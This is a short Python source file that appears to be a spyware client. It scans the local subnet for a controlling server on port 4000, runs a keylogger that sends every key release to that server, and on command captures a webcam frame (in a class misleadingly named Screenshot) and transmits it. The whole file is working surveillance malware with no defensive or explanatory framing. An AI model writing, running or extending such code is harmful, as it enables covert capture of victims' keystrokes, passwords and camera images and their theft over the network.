import socket, cv2, threading, keyboard

SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128

def get_ip_base():
    return '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1])

def connect_to_server():
    s = socket.socket()
    for i in range(1, 256):
        try:
            s.connect((f"{get_ip_base()}.{i}", SERVER_PORT))
            return s
        except socket.error:
            continue
    return None

class Command:
    def __init__(self, s): self.s = s

    def execute(self):
        while True:
            cmd = self.s.recv(BUFFER_SIZE).decode()
            if cmd == "screenshot": Screenshot(self.s).start()
            elif cmd == "exit": self.s.close(); break

class Screenshot:
    def __init__(self, s): self.s = s

    def start(self):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode(".jpg", frame)
            self.s.sendall("image".encode())
            self.s.recv(1024)
            self.s.sendall(f"{len(img_encoded)}".encode())
            self.s.recv(1024)
            self.s.sendall(img_encoded.tobytes())
        cap.release()
        cv2.destroyAllWindows()

class Keylogger:
    def __init__(self, s): self.s = s

    def callback(self, event):
        key = event.name if len(event.name) == 1 else f"[{event.name.upper()}]"
        self.s.sendall(key.encode())

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

if __name__ == "__main__":
    s = connect_to_server()
    if s:
        threading.Thread(target=Command(s).execute).start()
        threading.Thread(target=Keylogger(s).start).start()
